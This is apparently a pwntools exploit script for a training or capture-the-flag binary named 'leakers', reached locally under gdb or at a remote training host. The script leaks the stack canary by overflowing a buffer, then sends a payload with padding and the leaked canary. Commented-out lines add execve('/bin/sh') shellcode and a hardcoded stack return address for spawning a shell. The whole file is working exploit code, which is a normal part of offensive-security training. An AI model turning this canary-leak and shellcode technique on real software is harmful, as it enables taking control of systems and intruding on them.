from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./leakers")
    gdb.attach(r, """
        #b *0x04012c5
        b *0x04012f3
        c
        """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 2010)

r.sendline(b"thisisbsss")
print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)

leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

payload = b"A"*104 + p64(canary) + b"B"*20

r.send(payload)

time.sleep(0.1)

r.sendline("")

r.interactive()


#payload = b"A"*104 + p64(canary) + b"\x48\x89\xF7\x48\x83\xC7\x3D\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"

#r.send(b"\x48\x89\xF7\x48\x83\xC7\x3D\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00")

# 0x7ffca95d04d0
ret_address = b"\xd0\x04\x5d\xa9\xfc\x7f\x00\x00"

#payload =  b"\x90"*74 + shellcode + p64(canary) + b"B"*16 + ret_address